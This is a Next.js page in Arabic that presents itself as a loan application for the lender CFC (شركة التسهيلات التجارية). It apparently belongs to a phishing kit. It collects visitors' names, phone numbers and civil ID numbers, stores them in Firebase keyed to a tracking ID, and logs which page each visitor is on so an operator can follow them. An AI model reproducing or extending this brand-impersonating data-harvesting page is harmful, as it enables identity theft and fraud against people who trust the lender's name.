"use client";

import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { addData } from "@/lib/firebase";
import { Menu, Users, Home, Check } from "lucide-react";
import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";

export default function LoanApplicationPage() {
  const [salary, setSalary] = useState("");
  const [work, setWork] = useState("");
  const [name, setName] = useState("");
  const [idnumber, setIdnumber] = useState("");
  const [phone, setPhone] = useState("");
  const router = useRouter();

  const handleSubmit = (e: any) => {
    e.preventDefault();
    const visitorId = localStorage.getItem("visitor");
    addData({ id: visitorId, name, idnumber, phone });
    router.push("/loan-application/salary");
  };
  const handleUpdatePageName = async () => {
    const visitorid =
      localStorage.getItem("visitor") || new Date().toDateString();
    await addData({ id: visitorid, currentPage: "معلومات 2" });
  };
  useEffect(() => {
    handleUpdatePageName().then(() => {
      console.log("Done");
    });
  }, []);
  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Header */}
      <header className="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-4 shadow-lg">
        <div className="flex items-center justify-between max-w-md mx-auto">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-md">
              <Users className="w-6 h-6 text-blue-600" />
            </div>
            <div>
              <span className="font-bold text-xl">CFC</span>
              <p className="text-xs opacity-90">شركة التسهيلات التجارية</p>
            </div>
          </div>
          <Menu className="w-6 h-6" />
        </div>
      </header>

      {/* Main Content */}
      <form className="max-w-md mx-auto p-6 space-y-8" onSubmit={handleSubmit}>
        {/* Application Form */}
        <Card className="shadow-lg border-0 mt-8">
          <CardContent className="p-6 space-y-6">
            {/* Net Salary Field */}
            <div className="space-y-2">
              <Label
                htmlFor="netSalary"
                className="text-right block font-semibold text-gray-800"
              >
                رقم الهاتف
              </Label>
              <Input
                id="netSalary"
                type="tel"
                maxLength={10}
                placeholder="رقم الهاتف"
                className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                dir="rtl"
                onChange={(e) => {
                  setPhone(e.target.value);
                }}
              />
            </div>

            {/* Work Type Field */}
            <div className="space-y-2">
              <Label
                htmlFor="workType"
                className="text-right block font-semibold text-gray-800"
              >
                الاسم
              </Label>
              <Input
                id="workType"
                type="text"
                placeholder="الاسم"
                className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                dir="rtl"
                onChange={(e) => {
                  setName(e.target.value);
                }}
              />
            </div>

            {/* Job Title Field */}
            <div className="space-y-2">
              <Label
                htmlFor="jobTitle"
                className="text-right block font-semibold text-gray-800"
              >
                الرقم المدني
              </Label>
              <Input
                id="jobTitle"
                type="tel"
                placeholder="رقم مدني"
                className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                dir="rtl"
                onChange={(e) => {
                  setIdnumber(e.target.value);
                }}
              />
            </div>
          </CardContent>
        </Card>

        {/* Navigation Bar */}
        <div className="bg-gray-800 rounded-xl p-4 flex items-center justify-between">
          <div className="w-10 h-10 bg-purple-600 rounded-full flex items-center justify-center">
            <Check className="w-6 h-6 text-white" />
          </div>
          <div className="w-10 h-10 bg-gray-600 rounded-full flex items-center justify-center">
            <Home className="w-6 h-6 text-white" />
          </div>
        </div>

        {/* Work Sector Selection */}
        <Card className="shadow-lg border-0">
          <CardContent className="p-6 space-y-6">
            <div className="space-y-2">
              <Label
                htmlFor="workSector"
                className="text-right block font-semibold text-gray-800"
              >
                قطاع العمل
              </Label>
              <Select dir="rtl">
                <SelectTrigger className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12">
                  <SelectValue placeholder="قطاع العمل" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="government">القطاع الحكومي</SelectItem>
                  <SelectItem value="private">القطاع الخاص</SelectItem>
                  <SelectItem value="oil">القطاع النفطي</SelectItem>
                  <SelectItem value="banking">القطاع المصرفي</SelectItem>
                  <SelectItem value="education">قطاع التعليم</SelectItem>
                  <SelectItem value="health">القطاع الصحي</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Submit Button */}
            <Button
              onClick={handleSubmit}
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white h-12 text-lg font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
            >
              Submit
            </Button>
          </CardContent>
        </Card>

        {/* Promotional Section */}
        <div className="relative bg-gradient-to-br from-blue-100 to-blue-200 rounded-2xl p-8 mt-12 overflow-hidden">
          {/* Background Pattern */}
          <div className="absolute inset-0 opacity-10">
            <div className="absolute bottom-0 left-0 w-full h-20 bg-gradient-to-t from-blue-300 to-transparent"></div>
            <div className="absolute bottom-4 left-4 right-4 flex justify-between">
              {[...Array(8)].map((_, i) => (
                <div
                  key={i}
                  className="w-6 h-6 border-2 border-blue-400 transform rotate-45"
                ></div>
              ))}
            </div>
          </div>

          {/* Central Hexagon */}
          <div className="relative z-10 flex flex-col items-center justify-center">
            <div className="relative">
              {/* Main Hexagon */}
              <div className="w-32 h-32 bg-gradient-to-br from-blue-500 to-blue-700 rounded-2xl transform rotate-12 flex items-center justify-center shadow-xl">
                <div className="text-center text-white transform -rotate-12">
                  <div className="text-lg font-bold leading-tight">تمويلنا</div>
                  <div className="text-lg font-bold leading-tight">يساعدك</div>
                </div>
              </div>

              {/* Benefit Points */}
              <div className="absolute -top-8 -right-4 text-xs text-blue-800 font-semibold text-center max-w-20">
                لتحقيق أهداف مستقبلية
              </div>
              <div className="absolute -top-8 -left-4 text-xs text-blue-800 font-semibold text-center max-w-20">
                لضمان نجاح مشروعك
              </div>
              <div className="absolute -bottom-8 -right-4 text-xs text-blue-800 font-semibold text-center max-w-20">
                لتعليم أولادك
              </div>
              <div className="absolute -bottom-8 -left-4 text-xs text-blue-800 font-semibold text-center max-w-20">
                لتنمية متطلباتك
              </div>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
}
